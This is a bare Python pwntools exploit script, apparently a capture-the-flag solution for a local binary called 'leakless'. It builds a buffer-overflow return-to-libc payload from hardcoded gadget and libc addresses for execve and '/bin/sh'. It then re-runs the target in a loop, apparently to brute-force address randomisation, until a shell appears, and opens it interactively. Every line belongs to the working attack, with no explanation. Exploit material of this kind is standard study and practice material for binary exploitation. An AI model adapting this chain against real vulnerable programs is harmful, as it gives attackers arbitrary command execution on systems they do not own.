#!/usr/bin/env python
from pwn import *

p_p_p_ret = 0x80486b9
p_p_ret = 0x80486ba
p_ret = 0x80483ad

plt_read = 0x80483c0
plt_puts = 0x80483f0

got_puts = 0x804a018

buf = writable = 0x804a800
str_timeout = 0x80486e0

libc_execve = 0xf7e96350
libc_binsh  = 0xf7f538cf

libc_execve = 0xf7e9a350
libc_binsh = 0xf7f578cf


payload  = cyclic(cyclic_find("taaa"))
payload += p32(plt_puts) + p32(libc_execve) + p32(libc_binsh) + p32(0) + p32(0)
payload  = payload.ljust(0x100)


while True :
    p = process("./leakless")
    p.send(payload)
    if p.recvrepeat(1).find("/bin/sh") >= 0 :
        p.interactive()
